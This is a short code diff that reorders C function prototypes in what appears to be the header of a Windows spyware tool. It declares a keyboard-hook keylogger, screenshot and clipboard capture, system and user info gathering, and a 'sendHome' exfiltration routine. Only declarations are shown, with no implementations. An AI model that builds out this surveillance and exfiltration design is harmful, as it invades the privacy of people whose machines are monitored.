@@ -5,15 +5,19 @@
 
 #define DIV 10737418
 
-void screenshot();
-PBITMAPINFO createBitmapInfo(HBITMAP hBmp);
-void createBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hD);
-int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursive, int level);
-int list();
+PBITMAPINFO createBitmapInfo(HBITMAP);
 LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);
-void keylogger();
+
+int listDir(STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, int);
+int list();
+
+void createBMPFile(LPTSTR, PBITMAPINFO, HBITMAP, HDC);
+void sendHome(char*);
+
 void clipboard();
 void getUserInfo();  
 void getMemoryUsage();
 void getSystemInfo();
-void phoneHome(char *);
+void keylogger();
+void screenshot();
+void getIntel();
